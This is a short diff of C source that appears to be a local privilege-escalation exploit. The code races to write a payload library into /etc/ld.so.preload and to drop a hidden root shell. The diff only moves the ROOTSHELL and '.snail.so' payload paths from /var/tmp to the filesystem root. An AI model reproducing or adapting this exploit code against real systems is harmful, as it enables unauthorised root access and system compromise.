@@ -13,7 +13,7 @@
 #else
 #  define dprintf
 #endif
-#define ROOTSHELL "/var/tmp/.sh"
+#define ROOTSHELL "/.sh"
 #define ITERATIONS 1000
 /*
 ** Attempts to copy data to target quickly...
@@ -114,7 +114,7 @@ static pid_t race(char const *path, char const *target) {
   return child;
 }
 int main(int argc, char **argv, char **envv) {
-  char payload[] = "/var/tmp/.snail.so";
+  char payload[] = "/.snail.so";
   char const *target = "/etc/ld.so.preload";
   char const *privsep_path = argv[1];
   pid_t flood_pid, race_pid;
